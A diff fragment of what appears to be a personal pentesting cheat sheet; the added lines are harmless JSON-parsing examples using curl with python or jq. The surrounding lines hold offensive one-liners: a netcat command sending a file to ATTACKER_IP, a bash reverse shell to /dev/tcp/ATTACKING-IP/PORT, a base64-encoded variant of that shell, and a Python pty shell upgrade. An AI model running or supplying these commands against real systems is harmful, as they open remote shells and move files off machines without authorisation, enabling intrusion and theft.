@@ -5,9 +5,16 @@ python -c "import sqlite3; print(sqlite3.connect('database_name.db').cursor().ex
 Listen nc -vnl -s HOST -p PORT
 Copy CLIENT nc -w 3 ATTACKER_IP ATTACKER_PORT < [file_to_download] SERVER nc -l -s HOST -p PORT > [path_to_save]
 
-### Bash connects
+### Bash connects ###
 Connections "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING-IP/PORT 0>&1'"
 Encripted echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
+
+### Read json in bash with python ###
+curl -s 'https://api.github.com/users/lambda' | \
+    python3 -c "import sys, json; print(json.load(sys.stdin)['name'])"
+
+### Read json in bash with jq ###
+curl -s 'https://api.github.com/users/lambda' | jq -r '.name'
 
 ### Python PSEUDOshell ###
 python -c 'import pty; pty.spawn("/bin/bash")'
